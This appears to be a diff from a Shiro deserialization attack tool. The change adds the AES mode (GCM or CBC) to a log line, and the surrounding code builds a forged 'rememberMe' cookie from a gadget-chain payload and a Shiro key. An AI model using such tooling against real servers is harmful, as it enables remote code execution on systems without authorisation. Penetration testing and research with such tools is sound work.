@@ -1179,7 +1179,7 @@ public class AttackService {
                             ObjectPayload<?> gp = gadgetClazz.newInstance();
                             Object chainObject = gp.getObject(template);
                             String rememberMe = shiro.sendpayload(chainObject, "rememberMe", shiroKey);
-                            this.mainController.logTextArea.appendText(Utils.log("[jEG] 已封装，rememberMe length=" + (rememberMe != null ? rememberMe.length() : 0)));
+                            this.mainController.logTextArea.appendText(Utils.log("[jEG] 已封装，rememberMe length=" + (rememberMe != null ? rememberMe.length() : 0) + ", aesMode=" + (aesGcmCipherType == 1 ? "GCM" : "CBC")));
                             return EchoGenerateResult.ok("jEG", rememberMe, "Cookie");
                         }
                     } catch (Exception e) {
